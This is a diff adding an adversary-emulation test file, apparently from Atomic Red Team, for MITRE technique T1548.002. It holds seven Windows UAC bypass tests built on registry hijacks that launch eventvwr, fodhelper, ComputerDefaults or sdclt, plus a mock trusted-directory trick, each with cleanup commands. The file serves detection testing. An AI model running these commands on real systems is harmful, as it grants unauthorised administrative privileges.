@@ -1,0 +1,150 @@
+attack_technique: T1548.002
+display_name: 'Abuse Elevation Control Mechanism: Bypass User Access Control'
+atomic_tests:
+- name: Bypass UAC using Event Viewer (cmd)
+  auto_generated_guid: 5073adf8-9a50-4bd9-b298-a9bd2ead8af9
+  description: |
+    Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+    Upon execution command prompt should be launched with administrative privelages
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f
+      cmd.exe /c eventvwr.msc
+    cleanup_command: |
+      reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
+    name: command_prompt
+- name: Bypass UAC using Event Viewer (PowerShell)
+  auto_generated_guid: a6ce9acf-842a-4af6-8f79-539be7608e2b
+  description: |
+    PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
+    Upon execution command prompt should be launched with administrative privelages
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
+      Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+      Start-Process "C:\Windows\System32\eventvwr.msc"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Bypass UAC using Fodhelper
+  auto_generated_guid: 58f641ea-12e3-499a-b684-44dee46bd182
+  description: |
+    Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+    Upon execution, "The operation completed successfully." will be shown twice and command prompt will be opened.
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "#{executable_binary}" /f
+      reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+      fodhelper.exe
+    cleanup_command: |
+      reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+    name: command_prompt
+- name: Bypass UAC using Fodhelper - PowerShell
+  auto_generated_guid: 3f627297-6c38-4e7d-a278-fc2563eaaeaa
+  description: |
+    PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
+    Upon execution command prompt will be opened.
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+      Start-Process "C:\Windows\System32\fodhelper.exe"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
+    name: powershell
+- name: Bypass UAC using ComputerDefaults (PowerShell)
+  auto_generated_guid: 3c51abf2-44bf-42d8-9111-dc96ff66750f
+  description: |
+    PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
+    Upon execution administrative command prompt should open
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
+      New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+      Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
+      Start-Process "C:\Windows\System32\ComputerDefaults.exe"
+    cleanup_command: |
+      Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore
+    name: powershell
+    elevation_required: true
+- name: Bypass UAC by Mocking Trusted Directories
+  auto_generated_guid: f7a35090-6f7f-4f64-bb47-d657bf5b10c1
+  description: |
+    Creates a fake "trusted directory" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems
+    Upon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch
+  supported_platforms:
+  - windows
+  input_arguments:
+    executable_binary:
+      description: Binary to execute with UAC Bypass
+      type: path
+      default: C:\Windows\System32\cmd.exe
+  executor:
+    command: |
+      mkdir "\\?\C:\Windows \System32\"
+      copy "#{executable_binary}" "\\?\C:\Windows \System32\mmc.exe"
+      mklink c:\testbypass.exe "\\?\C:\Windows \System32\mmc.exe"
+    cleanup_command: |
+      rd "\\?\C:\Windows \" /S /Q >nul 2>nul
+      del "c:\testbypass.exe" >nul 2>nul
+    name: command_prompt
+    elevation_required: true
+- name: Bypass UAC using sdclt DelegateExecute
+  auto_generated_guid: 3be891eb-4608-4173-87e8-78b494c029b7
+  description: |
+    Bypasses User Account Control using a fileless method, registry only. 
+    Upon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe
+    [Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)
+    Adapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)
+  supported_platforms:
+  - windows
+  input_arguments:
+    command.to.execute:
+      description: Command to execute
+      type: string
+      default: cmd.exe /c notepad.exe
+  executor:
+    command: |
+      New-Item -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Value '#{command.to.execute}'
+      New-ItemProperty -Force -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute"
+      Start-Process -FilePath $env:windir\system32\sdclt.exe
+      Start-Sleep -s 3
+    cleanup_command: |
+      Remove-Item -Path "HKCU:\Software\Classes\Folder" -Recurse -Force -ErrorAction Ignore
+    name: powershell
